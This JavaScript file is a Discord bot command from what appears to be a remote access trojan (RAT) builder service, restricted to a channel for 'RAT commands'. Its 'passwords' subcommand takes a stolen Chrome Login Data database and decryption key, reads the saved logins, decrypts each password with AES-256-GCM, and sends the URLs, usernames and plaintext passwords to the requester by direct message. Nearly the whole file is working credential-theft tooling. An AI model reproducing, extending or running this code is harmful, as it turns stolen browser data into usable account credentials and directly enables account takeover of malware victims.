import { SlashCommandBuilder, EmbedBuilder } from "discord.js";
import { createDecipheriv } from "crypto";
import * as fs from "fs";
import sqlite3 from "sqlite3";
import request from "request";

export const cooldown = 10;
export const tier = [2, 3];
export const data = new SlashCommandBuilder()
  .setName("decrypt")
  .setDescription("Decrypts using key and value")
  .addSubcommand((subcommand) =>
    subcommand
      .setName("bytes")
      .setDescription("Decrypt bytes into string.")
      .addStringOption((option) => option.setName("key_bytes").setDescription("The Key Bytes").setRequired(true))
      .addStringOption((option) => option.setName("value_bytes").setDescription("The Value Bytes").setRequired(true))
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("passwords")
      .setDescription("Decrypt bytes into string.")
      .addStringOption((option) => option.setName("key_bytes").setDescription("The Key Bytes").setRequired(true))
      .addAttachmentOption((option) =>
        option.setName("login_data").setDescription("The Login Data file").setRequired(true)
      )
  )
  .setDMPermission(false);

export async function execute(client, interaction) {
  if (interaction.channel.id != client.config.building) {
    return client.sendErrorEmbed(interaction, `You can only build/use RAT commands in <#${client.config.building}>!`);
  }
  const subcommand = interaction.options.getSubcommand();
  const keyBytes = interaction.options.getString("key_bytes");
  const keyBytesArray = JSON.parse(keyBytes);
  if (subcommand == "bytes") {
    const valueBytes = interaction.options.getString("value_bytes");
    const valueBytesArray = JSON.parse(valueBytes);

    const decryptedData = decrypt(keyBytesArray, valueBytesArray);

    const successEmbed = new EmbedBuilder()
      .setColor(client.config.colors.commands.decrypt)
      .setTitle("Success! 🎉")
      .setDescription("Your bytes have been decrypted.")
      .addFields({
        name: "The decrypted string has been sent to your direct messages!",
        value: "If you did not receive it, make sure you can receive DMs from members in this server.",
        inline: false,
      });
    const valueEmbed = new EmbedBuilder()
      .setColor(client.config.colors.commands.decrypt)
      .setTitle("Your decrypted string")
      .setDescription("```" + decryptedData + "```");
    try {
      await interaction.member.user.send({ embeds: [valueEmbed] });
    } catch (error) {}
    interaction.reply({ ephemeral: true, embeds: [successEmbed] });
  } else if (subcommand == "passwords") {
    const loginData = interaction.options.getAttachment("login_data");
    const embed1 = new EmbedBuilder()
      .setColor("Green")
      .setTitle("Please wait")
      .setDescription(
        "✅ Your passwords are being decrypted. Please wait up to 1 minutes...\n\nStatus: Decrypting...\n0% [====================================]"
      );
    await interaction.reply({ ephemeral: true, embeds: [embed1] });
    try {
      await saveFile(loginData, "Loginvault.db");
      const conn = getDBConnection("Loginvault.db");

      if (conn) {
        const query = "SELECT action_url, username_value, password_value FROM logins";
        conn.all(query, async (err, rows) => {
          if (err) {
            console.log(err);
            return;
          }

          const embed = new EmbedBuilder().setColor(client.config.colors.commands.decrypt).setTitle("Passwords");

          var data = "";
          data += "*".repeat(50);
          for (const row of rows) {
            const { action_url, username_value, password_value } = row;
            if (action_url && username_value && password_value) {
              // (3) Filter the initialization vector & encrypted password from ciphertext
              // (4) Use AES algorithm to decrypt the password
              const decryptedPassword = decrypt(keyBytesArray, password_value);

              var extraData = "";
              extraData += `\nURL       : ${action_url}`;
              extraData += `\nUser Name : ${username_value}`;
              extraData += `\nPassword  : ${decryptedPassword}`;
              extraData += "\n" + "*".repeat(50);

              if (data.length + extraData.length > 4085) {
                embed.setDescription("```yaml\n" + data + "```");
                try {
                  await interaction.member.user.send({ embeds: [embed] });
                } catch (error) {}
                data = "*".repeat(50);
              }

              data += extraData;
            }
          }

          if (data.length > 0) {
            embed.setDescription("```yaml\n" + data + "```");
            try {
              await interaction.member.user.send({ embeds: [embed] });
            } catch (error) {}
          }

          const embed2 = new EmbedBuilder()
            .setColor(client.config.colors.commands.decrypt)
            .setTitle("Success! 🎉")
            .setDescription(
              "✅ Your passwords have been decrypted.\n\nStatus: Completed...\n100% [**====================================**]"
            )
            .addFields({
              name: "The decrypted string has been sent to your direct messages!",
              value: "If you did not receive it, make sure you can receive DMs from members in this server.",
              inline: false,
            });

          await interaction.editReply({ embeds: [embed2] });

          // Close database connection
          conn.close((err) => {
            if (err) console.log(err);
          });

          // Delete temp login db
          fs.unlinkSync("Loginvault.db");
        });
      }
    } catch (e) {
      console.log(`[ERR] ${e}`);
    }
  }
}

function decrypt(encryptedKey, buff) {
  const iv = new Buffer.from(buff.slice(3, 15));
  const payload = new Buffer.from(buff.slice(15, buff.length - 16));
  const authTag = new Buffer.from(buff.slice(buff.length - 16, buff.length));
  const key = new Buffer.from(encryptedKey);

  try {
    const decipher = createDecipheriv("aes-256-gcm", key, iv);
    decipher.setAuthTag(authTag);
    let decrypted = decipher.update(payload);
    decrypted += decipher.final("utf8");
    return decrypted;
  } catch (e) {
    console.error(e);
    return null;
  }
}

function getDBConnection(chromePathLoginDB) {
  try {
    return new sqlite3.Database(chromePathLoginDB);
  } catch (e) {
    console.log(e);
    return null;
  }
}

const saveFile = async (attachment, fileName) => {
  return new Promise((resolve, reject) => {
    const fileStream = fs.createWriteStream(fileName);
    const stream = request(attachment.url)
      .on("error", (err) => logError(err))
      .pipe(fileStream);
    stream.on("finish", () => {
      resolve();
    });
    stream.on("error", (err) => {
      logError(err);
      reject(err);
    });
  });
};
